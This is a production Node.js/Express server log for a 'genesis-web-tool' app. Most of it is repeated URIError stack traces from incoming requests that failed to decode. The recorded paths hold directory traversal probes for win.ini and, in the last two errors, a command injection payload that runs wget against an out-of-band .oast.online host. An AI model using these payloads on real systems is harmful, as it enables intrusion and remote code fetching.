
> genesis-web-tool@1.0.0 start /home/apps/applications/gui-server/genesis-web-tool
> NODE_ENV=production node ./src/server.js

Genesis listening at http://:::8082

> genesis-web-tool@1.0.0 start /hana/data/applications/ysa-webtool
> NODE_ENV=production node ./src/server.js

Genesis listening at http://:::8189

> genesis-web-tool@1.0.0 start /hana/data/applications/ysa-webtool
> NODE_ENV=production node ./src/server.js

Genesis listening at http://:::8189
URIError: Failed to decode param '/%80../%80../%80../%80../%80../%80../windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%80../%80../%80../%80../%80../%80../winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%80../%80../%80../%80../%80../%80../windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%80../%80../%80../%80../%80../%80../winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%80../%80../%80../%80../%80../%80../windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%80../%80../%80../%80../%80../%80../winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%80../%80../%80../%80../%80../%80../windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%80../%80../%80../%80../%80../%80../winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./windows/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%C0.%C0./%C0.%C0./%C0.%C0./%C0.%C0./winnt/win.ini'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;{wget,http:/ce3sa3lo79n815000010qqz511x9rzwpn.oast.online};%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BF%08%B7%06%08;{wget,http:/ce3sa3lo79n815000010wyt37pempewpf.oast.online};'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)
URIError: Failed to decode param '/%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;{wget,http:/ce3sa3lo79n815000010u3tfo4zaa7bpp.oast.online};%04%D7%7F%BF%18%D8%7F%BF%18%D8%7F%BFd%B8%06%08;{wget,http:/ce3sa3lo79n815000010wkjjfdthyg3ag.oast.online};'
    at decodeURIComponent (<anonymous>)
    at decode_param (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:172:12)
    at Layer.match (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:123:27)
    at matchLayer (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:574:18)
    at next (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:220:15)
    at /hana/data/applications/ysa-webtool/src/server.js:23:3
    at Layer.handle [as handle_request] (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:317:13)
    at /hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:284:7
    at Function.process_params (/hana/data/applications/ysa-webtool/node_modules/express/lib/router/index.js:335:12)

> genesis-web-tool@1.0.0 start /hana/data/applications/ysa-webtool
> NODE_ENV=production node ./src/server.js

Genesis listening at http://:::8189

> genesis-web-tool@1.0.0 start /hana/data/applications/ysa-webtool
> NODE_ENV=production node ./src/server.js

Genesis listening at http://:::8189

> genesis-web-tool@1.0.0 start /hana/data/applications/ysa-webtool
> NODE_ENV=production node ./src/server.js

Genesis listening at http://:::8189

> genesis-web-tool@1.0.0 start /hana/data/applications/ysa-webtool
> NODE_ENV=production node ./src/server.js

Genesis listening at http://:::8189

> genesis-web-tool@1.0.0 start /hana/data/applications/ysa-webtool
> NODE_ENV=production node ./src/server.js

Genesis listening at http://:::8189
